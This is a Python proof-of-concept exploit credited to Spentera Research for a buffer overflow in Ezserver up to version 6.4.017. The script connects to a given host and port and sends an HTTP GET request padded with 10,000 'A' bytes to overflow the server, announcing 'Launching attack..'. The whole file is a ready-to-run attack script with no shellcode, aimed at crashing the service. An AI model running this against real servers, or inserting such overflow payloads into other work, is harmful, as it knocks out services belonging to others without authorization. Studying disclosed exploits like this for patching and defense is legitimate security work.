#!/usr/bin/python

from socket import *
import sys

if len(sys.argv) != 3:
	print "[*] Proof of Concept of Ezserver <=6.4.017 Buffer Overflow"
	print "[*] by Spentera Research <research[at]spentera[dot]com>"
	print "[*] http://www.spentera.com/resources/security-advisory\n"
	print "[*] Usage: python %s <ip> <port>" %sys.argv[0]
	sys.exit(0)

host = sys.argv[1]
port = int(sys.argv[2])

junk = "\x41" * 10000
payload = junk

print "[!] Connecting to %s on port %d" % (host,port)
s = socket(AF_INET, SOCK_STREAM)

try:
	s.connect((host,port))
	print "[+] Launching attack.."
	s.send ("GET /" + payload + "HTTP/1.0\r\n\r\n\r\n")
	s.close()
except:
	print "[x] Could not connect to the server x_x"
	sys.exit()